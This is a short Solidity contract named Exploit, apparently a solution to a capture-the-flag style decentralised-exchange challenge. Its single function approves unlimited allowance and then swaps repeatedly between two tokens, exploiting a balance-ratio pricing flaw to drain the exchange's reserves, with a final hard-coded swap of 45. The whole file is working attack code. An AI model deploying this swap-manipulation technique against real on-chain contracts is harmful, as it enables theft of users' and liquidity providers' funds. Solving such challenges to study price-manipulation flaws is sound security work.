// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Dex.sol";

contract Exploit {
    function yoink(Dex dex) public {
        dex.approve(address(dex), type(uint256).max);
        address token1 = dex.token1();
        address token2 = dex.token2();
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, 45);
    }
}
